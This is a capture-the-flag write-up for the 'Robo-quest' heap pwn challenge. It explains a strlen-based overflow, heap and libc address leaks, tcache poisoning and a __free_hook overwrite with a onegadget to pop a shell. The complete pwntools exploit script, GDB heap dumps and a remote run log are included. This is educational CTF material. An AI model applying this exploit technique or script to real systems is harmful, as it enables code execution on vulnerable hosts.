# Robo-quest

The description for this challenge is as follows:

*In order to automate our procedures, we have created this data collector steam robot that will go out and ask questions on random citizens and store the data in his memory. Our only problem is that we do not have a template of questions to insert to the robot and begin our test. Prepare some questions and we are good to go!*

This challenge was rated at two out of four stars in difficulty, had 10 solves by the end of the competition, and was worth 500 points. This is a heap pwn challenge that requires a relatively straightforward implementation of tcache poisoning; it's a reasonably advanced technique, but you don't have to come up with anything super original to solve it.

**TL;DR Solution:** Realize that the modify and show options for question contents is flawed and rely on a call to strlen() to determine appropriate length, which can be abused by setting up the question contents to be flush against the next chunk's metadata, specifically the stated chunk length. Use this to overwrite a chunk's length to be longer, free that chunk, and obtain a lengthy overwrite into the next chunk. Use tcache poisoning to get libc addresses on the heap, use the overwrite to get a make a chunk that includes the libc address, then use the ability to overwrite the next chunk again to get an arbitrary overwrite, specifically to overwrite the free hook with a onegadget. Then trigger a free and pop a shell.

## Gathering Information:

The first step, as usual, is to try to run the program. The options do suggest heap pwn, and it appears likely that we will not be able to read or edit unallocated chunks.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/htb_uniCTF_finals22/pwn_roboquest/challenge$ ./robo_quest


Data collector Robo-quest is ready to be initialized with questions.


( ( o ) )
    |
+-------+
|  O O  |
|  ---  |
+-------+


1. Create
2. Show
3. Modify
4. Remove
> 1

[*] Question's size: 20
[*] Insert question here: aaaaaaaaaaaaaaaaaa

[+] Question has been created!


1. Create
2. Show
3. Modify
4. Remove
> 2

[*] Question's id: 0
[*] Question [0]: aaaaaaaaaaaaaaaaaa


1. Create
2. Show
3. Modify
4. Remove
> 2

[*] Question's id: 1
[-] There is no such question!


1. Create
2. Show
3. Modify
4. Remove
> 2

[*] Question's id: -1
[-] There is no such question!


1. Create
2. Show
3. Modify
4. Remove
> 2
```
Next, I opened up the program in Ghidra and had a look. The program is compiled with debug symbols, which is helpful. Question contents are placed in malloced sections of the heap, and up to 16 pointers to such heap chunks can be stored in a memset area of the stack. The most interesting thing to note here is how the length of the read for question modifications is determined. It performs a strlen() on the current contents of the question at the specified ID. 
```
void modify_question(long *memset_area)

{
  size_t __nbytes;
  long in_FS_OFFSET;
  int question_id;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("[*] Question\'s id: ");
  question_id = 0;
  __isoc99_scanf("%d",&question_id);
  if (((question_id < 0) || (0xf < question_id)) || (memset_area[question_id] == 0)) {
    puts("[-] There is no such question!\n");
  }
  else {
    printf("[*] New question: ");
    __nbytes = strlen((char *)memset_area[question_id]);
    read(0,(void *)memset_area[question_id],__nbytes);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
The show_question function has a similar problem; the question printed will continue as long as there is a continued string; i.e. a null byte is not hit.
```
void show_question(long *memset_area)

{
  long in_FS_OFFSET;
  uint question_id;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("[*] Question\'s id: ");
  question_id = 0;
  __isoc99_scanf("%d",&question_id);
                    /* The questions don't go beyond 0x10, and I can't show empty questions */
  if ((((int)question_id < 0) || (0xf < (int)question_id)) || (memset_area[(int)question_id] == 0))
  {
    puts("[-] There is no such question!\n");
  }
  else {
    printf("[*] Question [%d]: %s\n",(ulong)question_id,memset_area[(int)question_id]);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
```
Since the create_question function will let you specify question length, read in as many characters as that specified length, and no attempt is made to forcibly null terminate the question, that should allow us to overwrite metadata for the next heap chunk; specifically, we can overwrite/leak the bytes that specify the chunk's length. To test this, I set up a python pwntools script to create two, 24 byte-long questions. When we view heap contents in GDB/GEF, we can see that the string does seem to run into the next chunk's metadata, and the show_question option prints that length as part of the byte string when showing the first question's contents.
```
from pwn import *

target = process('./robo_quest')

pid = gdb.attach(target, "\nb *create_question\nb *show_question+172\nb *modify_question+175\nb *remove_question\n set disassembly-flavor intel\ncontinue")

#target = remote('139.59.174.208', 31412)

libc = ELF('.glibc/libc.so.6')
def create_question(size, content):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'1')

	print(target.recvuntil(b'Question\'s size:'))

	target.sendline(str(size))

	print(target.recvuntil(b'here:'))

	target.sendline(content)


def modify_question(question_id, content):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'3')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))

	print(target.recvuntil(b'question:'))

	target.sendline(content)

def show_question(question_id):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'2')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))
    
def remove_question(question_id):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'4')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))
    
create_question(0x18, b'a' * 0x18)
create_question(0x18, b'b' * 0x18)
show_question(0)

target.interactive()
```
```
gef➤  x/20gx 0x0000561f4cf4a260
0x561f4cf4a260: 0x6161616161616161      0x6161616161616161
0x561f4cf4a270: 0x6161616161616161      0x0000000000000021
0x561f4cf4a280: 0x6262626262626262      0x6262626262626262
0x561f4cf4a290: 0x6262626262626262      0x0000000000020d71
```
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/htb_uniCTF_finals22/pwn_roboquest/challenge$ python3 roboquest_writeup.py NOPTRACE
[+] Starting local process './robo_quest': pid 1566
[!] Skipping debug attach since context.noptrace==True
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/htb_uniCTF_finals22/pwn_roboquest/challenge/.glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\x1b[1;33m\n\nData collector Robo-quest is ready to be initialized with questions.\n\n\n( ( o ) )\n    |\n+-------+\n|  O O  |\n|  ---  |\n+-------+\n\x1b[0m\n\x1b[1;33m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
roboquest_writeup.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(size))
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;33m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;33m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
roboquest_writeup.py:44: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(question_id))
[*] Switching to interactive mode
 [*] Question [0]: aaaaaaaaaaaaaaaaaaaaaaaa!
```
## Overwriting Metadata for Heap Chunks and Leaking a Heap Address:

To begin with, here is some relatively basic background on the heap and what happens when chunks are freed. Freed chunks are stored in bins. Which bin specifically will depend on the circumstances and the libc version in use; this challenge seems to use libc2.27, so typically, chunks will initially be freed and stored in the tcache. tcache bins are singly-linked lists, and the bin a chunk goes into will depend on its total size including heap metadata (i.e. the bytes indicating size and flags). When a chunk is binned, the first sixteen bytes of content will be overwritten by additional metadata; the important part for our purposes is that the first eight bytes point to the next free chunk in the tcache that can be filled, which is called the fd or forward pointer, freed chunks are filled on a LIFO (last-in first-out) basis, and freed chunks will typically be refilled by similarly sized chunks.  

As an additional note, the 1's at the end of the chunk sizes are flags indicated that the previous physical chunk in the heap is in use, which can be important in cases of heap consolidation but isn't super relevant here.

Also, you can see that the libc provided is 2.27 by using strings.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/htb_uniCTF_finals22/pwn_roboquest/challenge$ strings -n10 .glibc/libc.so.6 | grep "libc-2."
libc-2.27.so
```
So far, we have a way to leak or edit the length of the next heap chunk. We can leverage this into an ability to arbitrarily edit as much of a heap chunk as we want, which, as the discerning reader may have noticed, creates the potential to overwrite the fd pointer to an arbitrary location and give us an arbitrary write primitive. The idea here is to allocate at least four chunks, which we will refer to as chunk a, b, c, and d, denoted by the characters written into the quote. The size of chunk b needs to be relatively small; we will be setting the quote length to 0x18, which would normally end up in the 0x20 bin when free due to metadata. Step one is to overwrite the stated size of chunk b to something larger; I've opted for 0x61 to increase the size to 0x60 and maintain the previously in-use flag.
```
gef➤  x/20gx 0x000055bd173e7260
0x55bd173e7260: 0x3030303030303030      0x3030303030303030
0x55bd173e7270: 0x3030303030303030      0x0000000000000051
0x55bd173e7280: 0x6262626262626262      0x6262626262626262
0x55bd173e7290: 0x6262626262626262      0x0000000000000021
0x55bd173e72a0: 0x6363636363636363      0x6363636363636363
0x55bd173e72b0: 0x6363636363636363      0x0000000000000021
0x55bd173e72c0: 0x6464646464646464      0x6464646464646464
0x55bd173e72d0: 0x6464646464646464      0x0000000000020d31
0x55bd173e72e0: 0x0000000000000000      0x0000000000000000
0x55bd173e72f0: 0x0000000000000000      0x0000000000000000
```
Step 2 is to free the chunk with the modified size. In GDB/GEF, the command "heap bins" is an easy way to check on the contents of various heap bin structures, including the tcache. In this case, we can see that after the free, chunk b has been placed in the 0x60 tcache. Then I free same-sized chunks d and c, in that order, so that the forward pointer on chunk c is filled and pointing to chunk c's start.
```
gef➤  x/20gx 0x000055bd173e7260
0x55bd173e7260: 0x3030303030303030      0x3030303030303030
0x55bd173e7270: 0x3030303030303030      0x0000000000000051
0x55bd173e7280: 0x0000000000000000      0x000055bd173e7010
0x55bd173e7290: 0x6262626262626262      0x0000000000000021
0x55bd173e72a0: 0x000055bd173e72c0      0x000055bd173e7010
0x55bd173e72b0: 0x6363636363636363      0x0000000000000021
0x55bd173e72c0: 0x0000000000000000      0x000055bd173e7010
0x55bd173e72d0: 0x6464646464646464      0x0000000000020d31
0x55bd173e72e0: 0x0000000000000000      0x0000000000000000
0x55bd173e72f0: 0x0000000000000000      0x0000000000000000
gef➤  heap bins
─────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────
Tcachebins[idx=0, size=0x20] count=2  ←  Chunk(addr=0x55bd173e72a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55bd173e72c0, size=0x20, flags=PREV_INUSE)
Tcachebins[idx=3, size=0x50] count=1  ←  Chunk(addr=0x55bd173e7280, size=0x50, flags=PREV_INUSE)
────────────────────────────────────────── Fastbins for arena 0x7fabe4f14c40 ───────────────────────────────────
...
```
Step 3 is to create a new quote, which we will set as 0x58 long. This will be placed in the available chunk from the 0x60 tcache, which will end up overwriting chunk c's contents. If I then write in 0x20 characters (0x1f letters, plus a newline), the contents are flush against the heap address and said address can be leaked by using the show_question() option.
```
gef➤  x/20gx 0x000055bd173e7260
0x55bd173e7260: 0x3030303030303030      0x3030303030303030
0x55bd173e7270: 0x3030303030303030      0x0000000000000051
0x55bd173e7280: 0x6565656565656565      0x6565656565656565
0x55bd173e7290: 0x6565656565656565      0x0a65656565656565
0x55bd173e72a0: 0x000055bd173e72c0      0x000055bd173e7010
0x55bd173e72b0: 0x6363636363636363      0x0000000000000021
0x55bd173e72c0: 0x0000000000000000      0x000055bd173e7010
0x55bd173e72d0: 0x6464646464646464      0x0000000000020d31
0x55bd173e72e0: 0x0000000000000000      0x0000000000000000
0x55bd173e72f0: 0x0000000000000000      0x0000000000000000
```
```
...
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;36m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
roboquest_writeup.py:44: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(question_id))
[*] Switching to interactive mode
 [*] Question [1]: eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
\xc0r>\x17U

1. Create
2. Show
3. Modify
4. Remove
> $
```
Here is the relevant portion of the script used to get these results:
```
create_question(0x18, b'a' * 0x18)
create_question(0x18, b'b' * 0x18)
create_question(0x18, b'c' * 0x18)
create_question(0x18, b'd' * 0x18)
modify_question(0, b'0' * 0x18 + b'\x51')
remove_question(1)
remove_question(3)
remove_question(2)
create_question(0x48, b'e' * 0x1f)
show_question(1)
```

## Leaking Libc Addresses:

Unfortunately, leaking heap addresses is not especially useful in this case. There is nothing especially useful on the heap in this case, and since PIE is enabled for the binary, I can't focus on the code section either. As a result, I need to get a leak for a more useful section. Specifically, I can do this by filling up a specific tcache bin. tcache bins are limited to 7 in length; once a tcache bin is filled, freed chunks size 0x80 or smaller go to a fastbin, and larger freed chunks go to an unsorted bin. If a chunk goes to the unsorted bin, the fd and bk pointers are set to libc addresses, which we could leak as described above.

So, all I need to do is carefully create and remove questions to specifically ensure that chunk c ends up in the unsorted bin with a libc address in the fd pointer, then leak it just like we leaked the heap address above.
```
gef➤  x/20gx 0x000055d10bad3260
0x55d10bad3260: 0x3030303030303030      0x3030303030303030
0x55d10bad3270: 0x3030303030303030      0x0000000000000051
0x55d10bad3280: 0x6565656565656565      0x6565656565656565
0x55d10bad3290: 0x6565656565656565      0x0a65656565656565
0x55d10bad32a0: 0x00007f5b5e76aca0      0x00007f5b5e76aca0
0x55d10bad32b0: 0x6363636363636363      0x6363636363636363
0x55d10bad32c0: 0x6363636363636363      0x6363636363636363
0x55d10bad32d0: 0x6363636363636363      0x6363636363636363
0x55d10bad32e0: 0x6363636363636363      0x6363636363636363
0x55d10bad32f0: 0x6363636363636363      0x6363636363636363
gef➤  heap bins
─────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────
Tcachebins[idx=8, size=0xa0] count=7  ←  Chunk(addr=0x55d10bad3700, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x55d10bad3660, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x55d10bad35c0, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x55d10bad3520, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x55d10bad3480, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x55d10bad33e0, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x55d10bad3340, size=0xa0, flags=)
────────────────────────────────────────── Fastbins for arena 0x7f5b5e76ac40 ──────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────── Unsorted Bin for arena '*0x7f5b5e76ac40' ───────────────────────────────────────
[+] unsorted_bins[0]: fw=0x55d10bad3290, bk=0x55d10bad3290
 →   Chunk(addr=0x55d10bad32a0, size=0xa65656565656560, flags=PREV_INUSE|NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
```
```
create_question(0x18, b'a' * 0x18)
create_question(0x18, b'b' * 0x18)
create_question(0x98, b'c' * 0x98)
create_question(0x98, b'd' * 0x98)
create_question(0x98, b'e' * 0x98)
create_question(0x98, b'f' * 0x98)
create_question(0x98, b'g' * 0x98)
create_question(0x98, b'h' * 0x98)
create_question(0x98, b'i' * 0x98)
create_question(0x98, b'j' * 0x98)
modify_question(0, b'0' * 0x18 + b'\x51')
remove_question(1)
remove_question(3)
remove_question(4)
remove_question(5)
remove_question(6)
remove_question(7)
remove_question(8)
remove_question(9)
remove_question(2)
create_question(0x48, b'e' * 0x1f)
show_question(1)
```
```
b"\n> \x1b[0m\n[*] Question's id:"
roboquest_writeup.py:44: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(question_id))
[*] Switching to interactive mode
 [*] Question [1]: eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
\xa0\xacv^[\x7f

1. Create
2. Show
3. Modify
4. Remove
> $
```
In GDB/GEF, I can then derive the address of a libc function like system, determine the difference between that function and the leak, then use the leak to find the libc address of system, then the base address of libc.
```
print(target.recvuntil(b'e' * 0x1f + b'\n'))
libc_leak_bytes = target.recv(6)
libc_leak = u64(libc_leak_bytes + b'\x00' * 2)
print(hex(libc_leak))
system_libc = libc_leak - 0x39c750
print(hex(system_libc))
libc_base = system_libc - libc.symbols['system']
```
## Getting an Arbitrary Overwrite and Winning:

So, in order to get an arbitrary overwrite, I just need to use the method outlined earlier to get unlimited overwrite into the next chunk and use that to overwrite the forward pointer of a tcache bin to my location of choice. Since I now also have a libc leak, I can use the in order to derive the location of the free hook, overwrite it with a onegadget, and pop a shell. If you are unfamiliar with this technique, a basic summary is that most versions of libc feature structures called the free and malloc hook. If they are not set to 0, the program will attempt to call the function pointer stored thereing when free or malloc, respectively, is called. A onegadget is a single address in libc that should pop a shell if certain conditions are met, and overwriting and triggering one of those hooks with a working onegadget is a good way to pop a shell.

First, the program tends to error out if I leave my unsorted bin with corrupted metadata, so I fix it to have an appropriate size and create a new quote to fill the physical space.
```
modify_question(1, b'z' * 0x18 + p64(0x61) + p64(libc_leak)[:6])

create_question(0x58, b'0' * 0x58)
```
I then add more quotes in a size that I haven't used yet so that they'll be added sequentially at the end of my physical heap space, and I once again set up the scenario where I corrupt the size of the next chunk then remove it. Next, I remove the two two subsequent chunks in reverse order so that I have an fd pointer in easy reach of my overwrite. Here is the heap at that point:
```
gef➤  x/20gx 0x0000564dac56e7a0
0x564dac56e7a0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x564dac56e7b0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x564dac56e7c0: 0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x564dac56e7d0: 0x7a7a7a7a7a7a7a7a      0x0000000000000051
0x564dac56e7e0: 0x0000000000000000      0x0000564dac56e010
0x564dac56e7f0: 0x3232323232323232      0x3232323232323232
0x564dac56e800: 0x3232323232323232      0x3232323232323232
0x564dac56e810: 0x3232323232323232      0x0000000000000041
0x564dac56e820: 0x0000564dac56e860      0x0000564dac56e010
0x564dac56e830: 0x3333333333333333      0x3333333333333333
gef➤
```
In the heap portrayed above, I can then create a new chunk that overflows into the freed chunk, maintains the existing size, and overwrites the fd pointer located at 0x564dac56e820 with the address of the free hook. Once that fd pointer is edited, the program thinks there is a free chunk where the free hook is.
```
gef➤  heap bins
─────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────
Tcachebins[idx=2, size=0x40] count=1  ←  Chunk(addr=0x7fd34a7e48e8, size=0x0, flags=)
Tcachebins[idx=8, size=0xa0] count=7  ←  Chunk(addr=0x564dac56e700, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x564dac56e660, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x564dac56e5c0, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x564dac56e520, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x564dac56e480, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x564dac56e3e0, size=0xa0, flags=PREV_INUSE)  ←  Chunk(addr=0x564dac56e340, size=0xa0, flags=)
```
Then create two additional questions; the first is an inconsequential write to the heap in order to get the chunk at the free hook next in the queue, the second actually overwrite the free hook with the onegadget. Then all we have to do is remove literally any question in order to trigger a call to free() and get the onegadget to execute.
```
gef➤  x/gx 0x7fd34a7e48e8
0x7fd34a7e48e8 <__free_hook>:   0x00007fd34a446432
```
Here is the bit of the exploit code that we needed to do everything described above:
```
create_question(0x38, b'1' * 0x38) #ID is 3
create_question(0x38, b'2' * 0x38) #ID is 4
create_question(0x38, b'3' * 0x38) #ID is 5
create_question(0x38, b'4' * 0x38) #ID is 6
show_question(3)
modify_question(3, b'z' * 0x38 + b'\x51')
remove_question(4)
remove_question(6)
remove_question(5)
create_question(0x48, b'x' * 0x38 + p64(0x41) + p64(free_hook))
create_question(0x38, b'A' * 0x38)
#This will overwrite the free hook with the onegadget.
create_question(0x38, p64(onegadget))

#This will trigger the free hook and the onegadget and pop a shell.
remove_question(0)
```
Here is the full exploit script:
```
from pwn import *

target = process('./robo_quest')

pid = gdb.attach(target, "\nb *create_question\nb *show_question+172\nb *modify_question+222\nb *remove_question\n set disassembly-flavor intel\ncontinue")

#target = remote('139.59.174.208', 31412)

libc = ELF('.glibc/libc.so.6')
def create_question(size, content):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'1')

	print(target.recvuntil(b'Question\'s size:'))

	target.sendline(str(size))

	print(target.recvuntil(b'here:'))

	target.sendline(content)


def modify_question(question_id, content):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'3')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))

	print(target.recvuntil(b'question:'))

	target.sendline(content)

def show_question(question_id):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'2')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))
    
def remove_question(question_id):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'4')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))
    
create_question(0x18, b'a' * 0x18)
create_question(0x18, b'b' * 0x18)
create_question(0x98, b'c' * 0x98)
create_question(0x98, b'd' * 0x98)
create_question(0x98, b'e' * 0x98)
create_question(0x98, b'f' * 0x98)
create_question(0x98, b'g' * 0x98)
create_question(0x98, b'h' * 0x98)
create_question(0x98, b'i' * 0x98)
create_question(0x98, b'j' * 0x98)
modify_question(0, b'0' * 0x18 + b'\x51')
remove_question(1)
remove_question(3)
remove_question(4)
remove_question(5)
remove_question(6)
remove_question(7)
remove_question(8)
remove_question(9)
#This one is going in the unsorted bin so that I can look at the libc addresses
remove_question(2)
create_question(0x48, b'e' * 0x1f)
show_question(1)
print(target.recvuntil(b'e' * 27 + b'\n'))
libc_leak_bytes = target.recv(6)
libc_leak = u64(libc_leak_bytes + b'\x00' * 2)
print(hex(libc_leak))
system_libc = libc_leak - 0x39c750
print(hex(system_libc))
libc_base = system_libc - libc.symbols['system']
onegadget = libc_base + 0x4f432 #0x4f3d5
print(hex(onegadget))
free_hook = libc_base + libc.symbols['__free_hook']
print(hex(free_hook))

#I found that we had a tendency to error out if I leave the libc leaking chunk damaged, so I modify it back to normal.

modify_question(1, b'z' * 0x18 + p64(0x61) + p64(libc_leak)[:6])

create_question(0x58, b'0' * 0x58)

create_question(0x38, b'1' * 0x38) #ID is 3
create_question(0x38, b'2' * 0x38) #ID is 4
create_question(0x38, b'3' * 0x38) #ID is 5
create_question(0x38, b'4' * 0x38) #ID is 6
show_question(3)
modify_question(3, b'z' * 0x38 + b'\x51')
remove_question(4)
remove_question(6)
remove_question(5)
create_question(0x48, b'x' * 0x38 + p64(0x41) + p64(free_hook))
create_question(0x38, b'A' * 0x38)
#This will overwrite the free hook with the onegadget.
create_question(0x38, p64(onegadget))

#This will trigger the free hook and the onegadget and pop a shell.
remove_question(0)

target.interactive()
```
And here is what that looks like when run against the remote server:
```
knittingirl@piglet:~/CTF/htb_uni_finals22/pwn_roboquest/challenge$ python3 roboquest_payload.py 
[+] Opening connection to 159.65.81.40 on port 30835: Done
[*] '/home/knittingirl/CTF/htb_uni_finals22/pwn_roboquest/challenge/.glibc/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\x1b[1;31m\n\nData collector Robo-quest is ready to be initialized with questions.\n\n\n( ( o ) )\n    |\n+-------+\n|  O O  |\n|  ---  |\n+-------+\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [*] New question:'
b' \x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [1] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [3] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [4] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [5] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [6] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [7] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [8] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [9] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [2] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [*] Question [1]: eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\n'
0x7f7690873ca0
0x7f76904d7550
0x7f76904d7432
0x7f76908758e8
b'\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [*] New question:'
b' \x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [*] Question [3]: 11111111111111111111111111111111111111111111111111111111A\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [*] New question:'
b' \x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [4] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
